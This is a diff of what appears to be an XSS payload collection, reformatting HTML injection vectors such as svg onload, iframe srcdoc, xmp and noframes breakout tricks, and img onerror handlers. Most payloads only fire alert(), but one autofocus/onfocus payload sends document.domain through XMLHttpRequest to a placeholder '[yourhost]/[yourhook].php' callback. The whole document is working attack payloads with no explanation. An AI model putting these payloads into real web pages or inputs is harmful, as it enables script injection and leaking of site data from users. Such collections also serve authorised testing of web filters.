@@ -10,7 +10,7 @@
 
 	<script src=data:&comma;alert("SRC XSS")>
 
-	<svg/onload=alert("SVG XSS")>
+	<svg/onload=alert("SVGXSS")>
 
 	<iframe src="" srcdoc="<script>alert("IFRAME XSS")</script>"></iframe>
 
@@ -20,17 +20,14 @@
 "autofocus/onfocus="thr=new XMLHttpRequest();
 			thr.open('GET','//[yourhost]/[yourhook].php?t=&d='+document.domain,true); 
 			thr.send(null);"//x@x.com
-			<--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
-			</code>
+			
+			</code><--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
 		</h1>
 
 	<h2> SVG 
 
-<xmp>
-	<p title="</xmp><svg/onload=alert("XMP")>">
-<noframes><p title="</noframes>
-		  <svg/onload=alert("NOFRAMES")>">
-<iframe>
+<xmp><p title="</xmp><svg/onload=alert("XMP")>">
+<noframes><p title="</noframes><svg/onload=alert("NOFRAMES")>"><iframe>
 	<p title="</iframe><svg/onload=alert("/IFRAMES")>">1'">
 		<img/src/onerror=.1|alert``>
 			</code>
